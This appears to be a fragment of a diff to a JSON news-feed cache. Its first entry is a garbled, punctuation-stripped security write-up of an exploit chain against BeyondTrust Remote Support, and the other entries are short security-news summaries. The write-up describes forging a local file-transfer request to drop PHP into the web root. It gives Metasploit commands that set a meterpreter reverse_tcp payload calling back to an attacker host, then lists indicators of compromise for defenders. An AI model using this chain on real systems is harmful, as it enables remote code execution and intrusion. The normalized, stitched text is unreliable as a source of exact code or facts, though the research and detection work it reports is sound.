reference cleanup other servercontext services pre p p p style direction ltr span style font size undefined span span style color rgb 24 128 56 font size undefined servercontext span span style font size undefined constructor span span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined span span style color rgb 24 128 56 font size undefined fun 002ae620 span span style font size undefined creates native provider span span style color rgb 24 128 56 font size undefined e1 span span style font size undefined builds name span span style color rgb 24 128 56 font size undefined local span span style font size undefined span span style color rgb 24 128 56 font size undefined e2 span span style font size undefined passes both file transfer service constructor span span style color rgb 24 128 56 font size undefined e3 span span style font size undefined span p p style direction ltr span style font size undefined exploit therefore uses span span style color rgb 24 128 56 font size undefined ftsname local span span style font size undefined native file factory analysis follows this provider native file filesystem info constructors span p h3 style direction ltr span style color rgb 67 67 67 choosing file contents destination span h3 p style direction ltr span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined span span style color rgb 24 128 56 font size undefined fun 00475820 span span style font size undefined handles span span style color rgb 24 128 56 font size undefined downloadanonymousfiles span span style font size undefined span p p style direction ltr span style font size undefined app thin scc anonymous download request span p pre omitted overwrite resume options transfer metadata setup func 0x0046d370 aplstack 128 downloadtoken lvar8 func 0x002a1970 lvar12 aplstack 128 lvar6 lvar8 0x40 if lvar8 param 2 lvar6 0x9c3700 func 0x001edf30 pustack 68 lvar6 f1 caller supplied transfer token func 0x0046d370 aplstack 148 serveraddress lvar8 func 0x002a1970 lvar12 aplstack 148 lvar6 lvar8 0x40 if lvar8 param 2 lvar6 0x9c3700 func 0x006f2e80 austack 1e4 lvar6 f2 caller supplied mrs file server address func 0x0046d370 aplstack 168 path lvar8 func 0x002a1970 lvar12 aplstack 168 lvar6 lvar8 0x40 if lvar8 param 2 lvar6 0x9c3700 func 0x001edf30 aplstack 88 lvar6 f3 caller supplied destination path uvar13 ulong ivar4 0 istack 1e8 func 0x004a21c0 param 1 aplstack 88 austack 1e4 pustack 68 austack 198 ivar5 0 f4 starts download using supplied path server token omitted temporary destruction transfer response construction pre p p p style direction ltr span style font size undefined function reads request s transfer token span span style color rgb 24 128 56 font size undefined f1 span span style font size undefined mrs server address span span style color rgb 24 128 56 font size undefined f2 span span style font size undefined destination path span span style color rgb 24 128 56 font size undefined f3 span span style font size undefined all three reach download routine span span style color rgb 24 128 56 font size undefined f4 span span style font size undefined span p p style direction ltr span style font size undefined this excerpt span span style color rgb 24 128 56 font size undefined lvar12 span span style font size undefined points request s field map span span style color rgb 24 128 56 font size undefined param 2 span span style font size undefined already been advanced map end sentinel span span style color rgb 24 128 56 font size undefined 0x9c3700 span span style font size undefined represents absent value span p p style direction ltr span style font size undefined app thin scc mrs download connection span p pre code long param 1 8 0x18 lstack d8 long param 1 8 param 3 10000 g1 connects serveraddress supplied this routine param 3 if lstack d8 0 char lstack d8 0x30 0 char lstack d8 0x31 0 uvar4 0 else omitted request map initialization func 0x00490020 plstack 68 request lvar5 func 0x00202790 austack b8 plstack 68 func 0x001f5f10 lvar5 0 undefined8 lvar5 8 get anonymous file 0x12 g2 omitted temporary key string destruction func 0x00490020 plstack 68 token uvar6 func 0x00202790 austack b8 plstack 68 func 0x001ee710 uvar6 param 4 g3 copies caller s downloadtoken omitted info field serialization send receive thread setup pre p p p span style font size undefined download routine span span style color rgb 24 128 56 font size undefined 0x004a21c0 span span style font size undefined opens mrs stream our address span span style color rgb 24 128 56 font size undefined g1 span span style font size undefined sends span span style color rgb 24 128 56 font size undefined get anonymous file span span style font size undefined span span style color rgb 24 128 56 font size undefined g2 span span style font size undefined our token span span style color rgb 24 128 56 font size undefined g3 span span style font size undefined token can 24 character random string because we control listener span p pre omitted stream setup relay metadata reference management puvar7 undefined8 func 0x00770620 0x450 omitted temporary setup resume calculation func 0x004a0700 puvar7 param 1 param 5 bvar8 param 7 param 8 puvar7 0x81 lstack d8 puvar7 0x82 lvar5 puvar7 unk 0099d3f8 omitted relay address transfer bookkeeping func 0x001ee710 puvar7 0x13 param 2 g4 retains requested destination path omitted transfer registration reference management func 0x002fcae0 puvar7 0x400000 g5 starts receive files thread pre p p p style direction ltr span style font size undefined same span span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined routine puts destination path into receive files thread span span style color rgb 24 128 56 font size undefined g4 span span style font size undefined starts span span style color rgb 24 128 56 font size undefined g5 span span style font size undefined span p p style direction ltr span style font size undefined app thin scc receive files loop span p pre omitted want file command match func 0x00490020 ppplvar20 dest filename uvar12 func 0x00202790 plstack 888 ppplvar20 pustack 8b8 ustack 418 func 0x001edf30 pustack 8b8 uvar12 h1 copies destination transfer metadata omitted provider filesystem info query reference cleanup bstack 931 byte plstack 848 0x1c pplstack 8d8 long ulong pplstack 8d8 0xffffffffffffff00 ulong bstack 931 1 pustack 900 austack 3f8 if bstack 931 1 func 0x001edf30 pustack 900 pustack 8b8 else func 0x001fabe0 pustack 900 pustack 8b8 n t h2 temporary receive path pre p p p span style font size undefined receive loop span span style color rgb 24 128 56 font size undefined 0x001d6430 span span style font size undefined consumes file metadata we send over stream copies span span style color rgb 24 128 56 font size undefined dest filename span span style font size undefined span span style color rgb 24 128 56 font size undefined h1 span span style font size undefined depending provider s file information receives into path temporary path ending span span style color rgb 24 128 56 font size undefined n t span span style font size undefined span span style color rgb 24 128 56 font size undefined h2 span span style font size undefined span p pre omitted begin file handling provider file object creation func 0x00321f50 plstack 828 pustack 928 plvar11 plstack 828 pcvar19 code plstack 828 0xc0 func 0x00490020 ppplvar20 b cvar5 pcvar19 plvar11 pustack 900 ppplvar20 lstack 908 h3 opens receive file omitted open failure handling positioning transfer loop branches ivar7 code plvar11 0x20 plvar11 plvar1 pplvar21 pplvar25 1 if 0 ivar7 pplstack 8d8 long long ivar7 lvar14 plstack 828 long param 1 0x160 long pplstack 8d8 long param 1 0x160 long param 1 0x168 long pplstack 8d8 long param 1 0x168 ivar9 code lvar14 0xd8 plstack 828 plvar1 h4 writes received data if ivar7 ivar9 omitted errno extraction error writing file response omitted progress completion handling pre p p p style direction ltr span style font size undefined after omitted span span style color rgb 24 128 56 font size undefined begin file span span style font size undefined code executed same span span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined receiver opens file span span style color rgb 24 128 56 font size undefined h3 span span style font size undefined writes incoming data span span style color rgb 24 128 56 font size undefined h4 span span style font size undefined span p p style direction ltr span style font size undefined completion receiver closes file when temporary path used renames final destination service already accepts absolute destination path so no directory traversal needed worker allows request because trusts forged local source address span p h3 style direction ltr span style color rgb 67 67 67 file upload php execution span h3 p style direction ltr span style font size undefined next step choose writable location web server would execute supplied config apache vhost conf sets document root span p pre home msfuser ingredi 24 1 2 app www public pre p p p style direction ltr span style font size undefined absolute upload into directory succeeded there small catch when requesting file url ending span span style color rgb 24 128 56 font size undefined php span span style font size undefined returns 404 even while file existed span span style color rgb 24 128 56 font size undefined app www public htaccess span span style font size undefined explains span p p style direction ltr span style font size undefined source app www public htaccess span p pre omitted application routes compatibility rewrites rewritecond request php i1 direct php urls return 404 rewriterule l r 404 omitted download helper routes rewritecond request filename d rewritecond request filename php f i2 extensionless url executes existing php file rewriterule 1 php l pre p span style font size undefined span p p style direction ltr span style font size undefined rule span span style color rgb 24 128 56 font size undefined i1 span span style font size undefined rejects direct span span style color rgb 24 128 56 font size undefined php span span style font size undefined request rule span span style color rgb 24 128 56 font size undefined i2 span span style font size undefined maps extensionless url existing php file span p p style direction ltr span style font size undefined requesting uploaded basename without span span style color rgb 24 128 56 font size undefined php span span style font size undefined executed our payload returned absolute filename euid 1000 output span span style color rgb 24 128 56 font size undefined id span span style font size undefined span p p style direction ltr span style font size undefined we also wanted avoid guessing remote support s working directory versioned installation name same native service can send us worker s span span style color rgb 24 128 56 font size undefined proc self environ span span style font size undefined using span span style color rgb 24 128 56 font size undefined uploadfiles span span style font size undefined this appliance contains span p pre bg app root home msfuser ingredi 24 1 2 brain meld socket path home msfuser ingredi 24 1 2 data tmp brain sock pre p span style font size undefined span p p style direction ltr span style color rgb 24 128 56 font size undefined bg app root span span style font size undefined gives us installation directory directly appending span span style color rgb 24 128 56 font size undefined app www public span span style font size undefined gives upload destination socket path provides another way identify same root there one protocol wrinkle procfs reports environment file s size zero but worker still streams contents we read through data stream s eof instead stopping advertised size span p h2 style direction ltr exploit h2 p style direction ltr span style font size undefined span href target self span style font size undefined metasploit module span span style font size undefined carries out chain using two fresh public customer sessions discovers thin worker through span span style color rgb 24 128 56 font size undefined director getgatewaysessionvalues span span style font size undefined own thin guest sends forged span span style color rgb 24 128 56 font size undefined localfiletransfer span span style font size undefined request worker s main dispatcher serves php bytes over existing mrs connection separate upload server not needed span p p style direction ltr span style font size undefined module writes random php filename into site s public directory then posts execution token extensionless url php file checks token unlinks itself before executing payload target span span style color rgb 24 128 56 font size undefined 0 span span style font size undefined runs php payload target span span style color rgb 24 128 56 font size undefined 1 span span style font size undefined wraps unix command php span p p style direction ltr span style font size undefined php meterpreter payload basic configuration span p pre use exploit linux http beyondtrust rs mrs file upload set rhosts 192 168 1 98 set target 0 set payload php meterpreter reverse tcp set lhost 192 168 1 68 run verbose true pre p span style font size undefined span p p span style font size undefined select target span span style color rgb 24 128 56 font size undefined 0 span span style font size undefined compatible command payload such span span style color rgb 24 128 56 font size undefined php meterpreter reverse tcp span span style font size undefined module documentation covers directory override other options span p figure style margin 0 img alt bt rs ra 1 png class embedded asset src style width auto type asset figure p style text align center span style font size undefined em figure 1 exploiting anonymous file transfer service metasploit em span p p span style font size undefined em em span p p span style font size undefined testing produced two php meterpreter sessions command wrapped php meterpreter session bash shell both targets also ran autocheck disabled immediate repeat exploitation succeeded bash shell returned span p pre uid 1000 msfuser gid 1000 msfuser groups 1000 msfuser 16 cron 70 postgres pre h2 style direction ltr iocs h2 p style direction ltr span style font size undefined excerpts below cover http requests native file transfer activity span span style color rgb 24 128 56 font size undefined thin scc span span style font size undefined customer connections recorded span span style color rgb 24 128 56 font size undefined brain span span style font size undefined they come our lab runs span span style font size undefined strong 28 29 october 2026 strong span span style font size undefined original timestamps addresses paths retained session transfer tokens redacted where noted unrelated entries omitted span p p style direction ltr span style font size undefined site logs stored under span span style color rgb 24 128 56 font size undefined bg app root log span span style font size undefined where span span style color rgb 24 128 56 font size undefined bg app root span span style font size undefined identifies remote support installation directory span p table thead tr th p style direction ltr span style font size undefined strong log strong span p th th p style direction ltr span style font size undefined strong evidence shown below strong span p th tr thead tbody tr td p style direction ltr span style color rgb 24 128 56 font size undefined httpd access log span p td td p style direction ltr span style font size undefined public session creation requests uploaded php endpoints span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined thin scc log span p td td p style direction ltr span style font size undefined native file transfer stream creation routing errors span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined thin scc errors log span p td td p style direction ltr span style font size undefined rejected file transfer requests including action destination path span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined brain log span p td td p style direction ltr span style font size undefined customer connection records client addresses timestamps span p td tr tbody table p p p style direction ltr span style font size undefined active workers also keep logs under span span style color rgb 24 128 56 font size undefined bg app root data tmp sdcust thin client thinmint span span style font size undefined collection details below explain these reach site log directory installation path varies between appliances span p h3 style direction ltr span style color rgb 67 67 67 requests uploaded php endpoint span h3 p style direction ltr span style font size undefined command only metasploit run created two public customer sessions invoked uploaded php endpoint then checked endpoint had gone relevant access log lines span p pre 192 168 1 68 28 oct 2026 21 12 23 0000 post api start session http 1 1 0s stat 200 size 1481 ref ua mozilla 5 0 macintosh intel mac os x 14 7 rv 133 0 gecko 20100101 firefox 133 0 192 168 1 68 28 oct 2026 21 12 23 0000 post api start session http 1 1 0s stat 200 size 1481 ref ua mozilla 5 0 macintosh intel mac os x 14 7 rv 133 0 gecko 20100101 firefox 133 0 192 168 1 68 28 oct 2026 21 12 31 0000 post qdgusthrmlirprls http 1 1 0s stat 200 size 0 ref ua mozilla 5 0 macintosh intel mac os x 14 7 rv 133 0 gecko 20100101 firefox 133 0 192 168 1 68 28 oct 2026 21 12 38 0000 post qdgusthrmlirprls http 1 1 0s stat 404 size 18 ref ua mozilla 5 0 macintosh intel mac os x 14 7 rv 133 0 gecko 20100101 firefox 133 0 192 168 1 68 28 oct 2026 21 12 43 0000 get qdgusthrmlirprls http 1 1 0s stat 404 size 18 ref ua python urllib 3 9 pre p style direction ltr span style font size undefined span p p span style font size undefined here span span style color rgb 24 128 56 font size undefined qdgusthrmlirprls span span style font size undefined mapped span span style color rgb 24 128 56 font size undefined qdgusthrmlirprls php span span style font size undefined public directory first post ran command returned 200 later post module s cleanup request get independently checked endpoint both received 404 after file had deleted itself span p p style direction ltr span style font size undefined this gives defenders sequence investigate public session creation followed request unfamiliar endpoint potentially followed 404s same path session creation alone normal remote support activity 200 followed 404 also insufficient itself correlate requests file changes session records any unusual outbound connections span p h3 style direction ltr span style color rgb 67 67 67 url may not contain php span h3 p style direction ltr span style font size undefined earlier php canary produced these lines span p pre 192 168 1 68 28 oct 2026 20 50 07 0000 get msfcanary03d80193f0880b php http 1 1 0s stat 404 size 18 ref ua python urllib 3 9 192 168 1 68 28 oct 2026 20 50 35 0000 get msfcanary03d80193f0880b http 1 1 0s stat 200 size 368 ref ua python urllib 3 9 192 168 1 68 28 oct 2026 20 50 35 0000 get msfcanary03d80193f0880b http 1 1 0s stat 404 size 18 ref ua python urllib 3 9 pre p style direction ltr span style font size undefined span p p span style font size undefined direct span span style color rgb 24 128 56 font size undefined php span span style font size undefined request failed while extensionless request executed same file final 404 followed self deletion detection only searches requests ending span span style color rgb 24 128 56 font size undefined php span span style font size undefined would miss successful request this example span p p style direction ltr span style font size undefined native transfer itself travels inside customer mrs connection these access log entries show http trigger not file contents forged router id captured http log does not expose inner mrs messages so cannot establish origin bypass own span p h3 style direction ltr span style color rgb 67 67 67 files connections span h3 p style direction ltr span style font size undefined look unexpected php files under site s public directory receive files ending span span style color rgb 24 128 56 font size undefined php n t span span style font size undefined interrupted transfer may leave temporary file even if final url returns 404 span span style color rgb 24 128 56 font size undefined n t span span style font size undefined suffix also belongs normal transfer implementation so presence needs context span p h3 style direction ltr span style color rgb 67 67 67 native file transfer traces span h3 p style direction ltr span style color rgb 24 128 56 font size undefined thin scc log span span style font size undefined span span style color rgb 24 128 56 font size undefined thin scc errors log span span style font size undefined contain more direct evidence file service requests example this line span span style color rgb 24 128 56 font size undefined thin scc errors log span span style font size undefined names action native provider intended php destination only span span style color rgb 24 128 56 font size undefined ckey span span style font size undefined span span style color rgb 24 128 56 font size undefined downloadtoken span span style font size undefined been redacted span p pre 20261029 17 01 33 999999 thin scc 11801 proc localfiletransfer t11832 ft warning discarding nonlocal message localfiletransfer action downloadanonymousfiles ckey redacted downloadtoken redacted enableresume 0 ftsname local path home msfuser ingredi 24 1 2 app www public envresolve28f788af6a1c39bf php serveraddress 1 1022182175 9000 wantoverwriteprompts 0 pre p span style font size undefined span p p style direction ltr span style font size undefined this our negative control request used customer s ordinary source address rejected evidence attempted invocation not successful upload forged local source passes check produces this warning so successful exploit need not leave span span style color rgb 24 128 56 font size undefined discarding nonlocal message span span style font size undefined entry span p p style direction ltr span style font size undefined successful php module run left these lines span span style color rgb 24 128 56 font size undefined thin scc log span span style font size undefined span p pre 20261029 17 06 37 319 thin scc 14419 proc localfiletransfer t14486 mrs stream info createstream connecting address 1 1129726787 1031 20261029 17 06 37 2 thin scc 14419 proc localfiletransfer t14486 mrs cl error nodeid not found node list even after renumerating 0 20261029 17 06 37 0 thin scc 14419 proc localfiletransfer t14486 msg dsp error failed create mailbox sending 0 0 0 pre p span style font size undefined span p p style direction ltr span style font size undefined our requests omit span span style color rgb 24 128 56 font size undefined responseaddress span span style font size undefined handler starts transfer then tries send action response empty address produces span span style color rgb 24 128 56 font size undefined 0 0 0 span span style font size undefined error without preventing file write payload callback independently confirms execution span span style color rgb 24 128 56 font size undefined 17 06 37 span span style font size undefined span p p style direction ltr span style font size undefined look this combination span span style color rgb 24 128 56 font size undefined proc localfiletransfer span span style font size undefined context especially around unfamiliar php requests outbound connections span span style color rgb 24 128 56 font size undefined 1 1129726787 1031 span span style font size undefined value identifies internal mrs mailbox use brain connection records below client ip these entries do not identify written filename prove execution their own empty address errors also depend exploit request constructed another implementation may leave different traces span p h3 style direction ltr span style color rgb 67 67 67 brain connection records span h3 p style direction ltr span style color rgb 24 128 56 font size undefined brain log span span style font size undefined helps link activity client address these two entries preceded same module run span p pre 20261029 17 06 30 0 brain 6339 lstner t06500 brn lstn info received fd 47 app name ingredi support desk customer remoteipaddress 192 168 1 68 localipaddress 192 168 1 98 isloopback 0 20261029 17 06 30 0 brain 6339 lstner t06500 brn lstn info received fd 49 app name ingredi support desk customer remoteipaddress 192 168 1 68 localipaddress 192 168 1 98 isloopback 1 pre p p p style direction ltr span style font size undefined these useful timeline but customer connections normal activity we found no span span style color rgb 24 128 56 font size undefined uploadfiles span span style font size undefined span span style color rgb 24 128 56 font size undefined downloadanonymousfiles span span style font size undefined action records captured brain logs generic eof connection reset conference errors also appeared they too broad treat exploit indicators themselves span p h3 style direction ltr span style color rgb 67 67 67 where collect native logs span h3 p style direction ltr span style font size undefined aggregated logs under span span style color rgb 24 128 56 font size undefined bg app root log span span style font size undefined while worker running own logs under span span style color rgb 24 128 56 font size undefined bg app root data tmp sdcust thin client thinmint span span style font size undefined wrapper appends those logs site s log directory when worker exits then clears per worker copies collect both locations when investigating live session span p p style direction ltr span style font size undefined captured span span style color rgb 24 128 56 font size undefined brain ini span span style font size undefined span span style color rgb 24 128 56 font size undefined thin scc ini span span style font size undefined both had debug output disabled span span style color rgb 24 128 56 font size undefined enabled 0 span span style font size undefined no debug log captured we did not change logging configuration brain s debug configuration also limits span span style color rgb 24 128 56 font size undefined mrs span span style font size undefined categories span span style color rgb 24 128 56 font size undefined info span span style font size undefined so enabling debug output alone would not guarantee detailed message payloads span p p style direction ltr span style font size undefined names such span span style color rgb 24 128 56 font size undefined uploadfilestarted span span style font size undefined span span style color rgb 24 128 56 font size undefined downloadfileended span span style font size undefined occur native protocol s callback code but we did not find them collected logs they should not presented default audit events span p",
+      "ts": 1793397723.8548162
+    },
+    {
+      "norm": "california officials confirm grand jury subpoenas states civil groups brace protect elections federal encroachment p los angeles county officials told cyberscoop they received multiple grand jury subpoenas investigating alleged election fraud states civil groups call federal power play p p post href officials confirm grand jury subpoenas states civil groups brace protect elections federal encroachment appeared first href",
+      "ts": 1793397723.8548262
+    },
+    {
+      "norm": "trezor warns suspected crypto theft implant hardware wallet hardware wallet device maker trezor received credible reports about suspected hardware crypto theft implant trezor safe 5 sold reseller cryptobilis southeast asia",
+      "ts": 1793397723.8548307
+    },
+    {
+      "norm": "florida warns 4 9 million people had social security numbers leaked financial aid site breach state s department education fldoe said thursday became aware data breach involving florida student financial aid website october 19",
+      "ts": 1793397723.854836
+    },
+    {
+      "norm": "framework puts ransomware resilience ai systems focus raid ai aims help organizations assess their security preparation ransomware attacks targeting ai systems",
+      "ts": 1793397723.8548412
+    },
+    {
+      "norm": "l italia afflitta da vulnerabilit informatiche senza una causa chiara i ricercatori non riescono spiegare del tutto perch le minacce informatiche italia siano cos diverse rispetto quelle di qualsiasi altro paese",
+      "ts": 1793397723.8548458
+    },
+    {
+      "norm": "bloatware aftermarket auto parts p this href interesting p blockquote p one civic owner purchased cheap aftermarket head unit off amazon decided claude work magic like would smart tv reportedly discovered isn t surprising but worth knowing about p p among pre installed bloatware spyware if you re being less charitable voice assistant equipped webview android system component lets apps display content off web this apparently always used about third processing power even while idle which isn t great there also baidu location services call recorder dab radio client pretty much useless u s adobe acrobat presumably so your passenger can entertain themselves pdfs go p blockquote",
+      "ts": 1793397723.8548498
+    },
+    {
+      "norm": "teamviewer flaw lets remote computers attack users who connect control them teamviewer fixed flaw lets machine being controlled remote session attack computer connected control teamviewer session computer connects takes control viewer machine controls host malicious compromised host can exploit flaw crash viewer s teamviewer depending platform may also run",
+      "ts": 1793397723.8548539
+    },
+    {
+      "norm": "defense contractor pleads guilty aiding north korean remote worker scheme p 62 year old allowed co conspirators use his identity top secret security clearance apply almost 100 jobs last year scheme s success rate limited p p post href contractor pleads guilty aiding north korean remote worker scheme appeared first href",
+      "ts": 1793397723.854858
+    },
+    {
+      "norm": "php2shell attacks root palo alto firewalls but fail against wordpress p over 22 6 million exposed instances potentially affected critical php flaws been targeted over week p p post href attacks root palo alto firewalls but fail against wordpress appeared first href",
+      "ts": 1793397723.8548625
+    },
+    {
+      "norm": "other news anthropic breach dispute uefi flaw hits most servers cloudflare ai data leak p noteworthy stories might slipped under radar iran eyed military freezer hacks copenhagen university breach ai powered malware p p post href other news anthropic breach dispute uefi flaw hits most servers cloudflare ai data leak appeared first href",
+      "ts": 1793397723.854867
+    },
+    {
+      "norm": "malicious claude code extension cursor planted ssh backdoors malicious version anthropic s claude code vs code extension distributed through cursor s extension marketplace approximately 11 hours october 29 exposing up 5 000 developers malware designed install persistent ssh backdoors",
+      "ts": 1793397723.854872
+    },
+    {
+      "norm": "syrian hacker who served assad regime gets 42 months us prison p ahmad umar agha best known posting fake associated press tweet claiming president obama injured white house bombing p p post href hacker who served assad regime gets 42 months us prison appeared first href",
+      "ts": 1793397723.8548772
+    },
+    {
+      "norm": "syrian electronic army hacker gets prison time attacks western targets ahmad umar agha known online th3pr0 sentenced thursday federal court virginia 42 months behind bars his role conspiracy organized former syrian president bashar al assad s closest advisers",
+      "ts": 1793397723.854881
+    },
+    {
+      "norm": "undead software projects continue raise security risks security firm patched decade old app prevent takeover millions machines highlighting abandoned domains remain boon attackers",
+      "ts": 1793397723.8548856
+    },
+    {
+      "norm": "wordpress rce flaw draws nearly 63 000 attack attempts just 24 hours threat actors been observed attempting exploit high severity security flaw wordpress core shortly after patches released vulnerability which does not cve identifier relates case remote code execution impacting wordpress core versions 4 7 through 7 1 3 carries cvss score 8 1 cvss scoring system patches flaw released october",
+      "ts": 1793397723.8548899
+    },
+    {
+      "norm": "ss7 diameter attacks signaling flaws expose your phone flaws ss7 diameter signaling protocols can allow attackers track phone locations intercept calls sms verification codes impersonate subscribers without compromising their devices cape explains these attacks exploit trust between networks security focused mobile service helps defend against them",
+      "ts": 1793397723.8548942
+    },
+    {
+      "norm": "passkeys better than passwords but they not enough p organizations eliminate passwords attackers adapt instead attacking authenticator directly they look opportunities around p p post href better than passwords but they not enough appeared first href",
+      "ts": 1793397723.8548982
+    },
+    {
+      "norm": "bulletproof host virtualine loses domain fbi seizure p allowed customers host hack hire services supported ransomware infostealer operators accepted crypto payments p p post href host virtualine loses domain fbi seizure appeared first href",
+      "ts": 1793397723.8549027
+    },
+    {
+      "norm": "assad regime hacker who caused 136 billion market drop sentenced 42 months p syrian man who used hijacked news agency twitter account post fake report explosions white house been sentenced 42 months prison us department justice announced ahmad umar agha also known th3pr0 sentenced thursday federal court eastern district virginia his central role hacking conspiracy organized led members former syrian president href rel nofollow more span class meta nav span p p post href regime hacker who caused 136 billion market drop sentenced 42 months appeared first href net security p",
+      "ts": 1793397723.8549078
+    },
+    {
+      "norm": "cisa says max severity gitlab flaw now exploited wild attackers started exploiting maximum severity gitlab vulnerability patched earlier this month according us cybersecurity infrastructure security agency cisa",
+      "ts": 1793397723.854911
+    },
+    {
+      "norm": "shufti ties ai agent actions verified owners permissions p shufti launches know your agent kya ai agent verification solution designed verify autonomous ai agents acting behalf individuals businesses agentic commerce enables ai agents open accounts place orders move funds their owners business receiving one these requests needs know whether agent genuine who accountable whether action falls within person approved valid access token alone href rel nofollow more span class meta nav span p p post href ties ai agent actions verified owners permissions appeared first href net security p",
+      "ts": 1793397723.8549154
+    },
+    {
+      "norm": "british spy agency cannot account thousands data storage devices watchdog says investigatory powers commissioner s office ipco annual report 2025 published thursday said very concerned disappointed time taken gchq investigate issue",
+      "ts": 1793397723.8549192
+    },
+    {
+      "norm": "bedrock data routes data exposure fixes owners verifies results p bedrock data announced ai assisted remediation which federates work fixing data exposure data owners across enterprise bedrock data discovers who owns each exposed dataset opens ticket owner jira servicenow workflow enterprise already runs supplies context needed fix when owner closes ticket bedrock data validates exposure remediated reopens ticket if not href rel nofollow more span class meta nav span p p post href data routes data exposure fixes owners verifies results appeared first href net security p",
+      "ts": 1793397723.854923
+    },
+    {
+      "norm": "trezor warns suspected hardware implant one wallets sold cryptobilis trezor safe 5 hardware wallet bought reseller cryptobilis extra circuit board sends out recovery phrase over mobile network customer reported trezor not yet examined device telling everyone who bought trezor cryptobilis since march 2026 move their funds wallet recovery phrase trezor said blog post",
+      "ts": 1793397723.854927
+    },
+    {
+      "norm": "urgent security fixes aren t fixed observe prove act confirm gets them moving alert critical fix known ticket sits queue days security teams understand risk but people who keep applications available need proof change won t break anything their concerns practical ips protection could block legitimate traffic configuration change could interrupt service endpoint policy could affect application",
+      "ts": 1793397723.8549309
+    },
+    {
+      "norm": "intigriti bug bytes 241 october 2026 welcome latest edition bug bytes this month s issue we ll featuring full microsoft edge exploit chain using only logic bugs 1 click rce discord via twitch embed 250k chrome full chain bounty just 6 days xss cloudflare s image endpoint via svg sanitizer bypass 90k google rce via flask session pickle deserialization so much more let s dive october 21 emergency patches released two critical vulnerabilities php s core engine php2shell cve 20",
+      "ts": 1793397723.8549354
+    },
+    {
+      "norm": "attack email hosting provider german far right party afd exposed 345k accounts alternative f r deutschland swats away scandals reporters swarm leaked email tranche",
+      "ts": 1793397723.854939
+    },
+    {
+      "norm": "fuzzers vs ai comparing fuzzilli bigsleep javascript engines summary project zero compared two automated tools used google find vulnerabilities chrome s javascript engine v8 regular basis fuzzilli generative javascript engine fuzzer bigsleep llm based bug finding system past six months bigsleep found more vulnerabilities than fuzzilli 45 versus 37 25 overlap specific bugs reported since this comparison methodology tendency underestimate overlap we also performed dedicated experiments test theoretical overlap vulnerabilities reported since 2023 these experiments estimated overlap roughly 60 regardless which value accurate substantial portion vulnerabilities discoverable only llms only fuzzing while extremely promising llms become able find so many vulnerabilities so quickly fuzzing llms still complementary approaches we recommend vendors perform both fuzzing agentic analysis their code maximize number vulnerabilities get reported before they impact users",
+      "ts": 1793397723.854943
     }
   ],
   "seen": {
     "003902bc855556173275bea0fb9d1d3d3eb9aab7": 1793138159.3553932,
     "004c185054dc7de7219af1aa37378a49f00d5b80": 1793138159.3554444,
     "005f2528861a55a191e59b090439d009eb10d00f": 1793313196.7376497,
-    "015a882ee27441d99ede10a82545a88221aa6e5f": 1792789733.6280258,
     "024ddaa0944f0f1f8e596b8bff0764adf2bb199d": 1793190053.922643,
     "028fbbce931a7931f6f5eab152b576931b7a8c0b": 1792837883.2230594,
     "03f54c74f6feb39826b170f3d610b9677919c072": 1793053505.7234526,
@@ -2269,14 +2272,16 @@
     "04e7535e61e612e78ea250399339944f742d819c": 1792960349.631153,
     "05abb43d9baf5f9f0fb8861b3420fa30ff080ce3": 1793138159.35558,
     "05b41d1861c0bce38027d49692866ddcf2e1e25d": 1792873573.071605,
+    "05fccf2ddeb1f46be57b6eddf2ef4c06e050c03f": 1793397723.8548262,
     "064692977b9f759f2e83049346467d3f1d94de35": 1792925842.07074,
-    "077ef200d3e00808e9c4e6c39d1f1cd559c1ed94": 1792789733.6280153,
     "083a1ea7d205dcd0ee26de4c0408cc98f6c997c6": 1793277016.6412232,
     "085573e20d778f07e10ed7dab7cd157b7f50e856": 1793190053.9225864,
     "0894723045c0f53843faf33b1ffc169e7e1a2c55": 1793053505.7234704,
+    "09382f93624b985e9186957114e4fa2aa4be8e5c": 1793397723.854911,
     "0a017a81c0c4ef31675f0caecee703ceaa181c06": 1792837883.223128,
     "0a02340233325a551f4843ac76eaf4e13196c035": 1792837883.223045,
     "0a6caa749fefc6901cf7bf990da9a517ed94aa70": 1793101639.241014,
+    "0a89691e7bed3ebc5f082c6ec4f260dc53c334d8": 1793397723.8547864,
     "0afa3606f14eb6615a23345716efacf6c3a89dd5": 1793138159.3555536,
     "0bb24fdc38bc95ed701123218bcd927004af1e37": 1792873573.0716574,
     "0c34834f51359083617f8c1a4e915fa05ad5280b": 1792960349.6310236,
@@ -2284,6 +2289,7 @@
     "0d8d39d2f11bfaafee370051ee5640e8903b22cf": 1793190053.9224975,
     "0d99ee2b282857bf5a8f9a03ad4c7ab90154297c": 1793053505.7234886,
     "0db65351a44dfbf2774e54a3b0c1b8ba73a32abf": 1792837883.2231436,
+    "0e377490003110b1234df3866658c3586deaabd8": 1793397723.8549309,
     "0f625bcdfa97d28044241e77304b9303ca7cadbb": 1792960349.6311066,
     "104d630292349d7f4a58237327f66452d73bd3be": 1793053505.723503,
     "10e92bd49867d2da5f4080d82c76b8609bd7faaf": 1793225997.5879076,
@@ -2313,11 +2319,11 @@
     "18137863896126e00e9c49c510b5f7efeb160788": 1793101639.2409205,
     "18bf141d2661557ca190612f030aeca98ea90a13": 1792960349.63102,
     "196b1e60527b22e411e7bbb8a5dd9e3090f4789f": 1793277016.6412318,
-    "19d73113a247b89d34e6e46fe157ecd32105756e": 1792789733.6281211,
     "1a44d05f6353d10866c01b2a744c1ff7d14d885d": 1793101639.2410235,
     "1a47a5dbcb816a0edbc83d701e208a334b1d38c6": 1793053505.7233999,
     "1afcb21b97fb0a5d5c141faf7be7cdc645e253fc": 1792873573.0715005,
     "1b00cdb86a3b84d7b278c32e189b09f943ed5b27": 1793053505.7235105,
+    "1b6528cb525ca35ccfe4c6de278bdda1b74f925a": 1793397723.8549354,
     "1d293d8c69b8c633fdbdce26a8d8e845ecf996ac": 1793225997.5880003,
     "1d721fa902295cc1323e6b897f6a88f97bec8dd8": 1793101639.2410202,
     "1d97e61eedbe02c5957c67a666c19c17139a56e3": 1792873573.0715609,
@@ -2326,7 +2332,6 @@
     "1e20ad9d24a5312aad007ae09b29613d970da8a3": 1793277016.641279,
     "1e643864d18e2f3fc1c19b927a334bfb5b852315": 1792873573.07162,
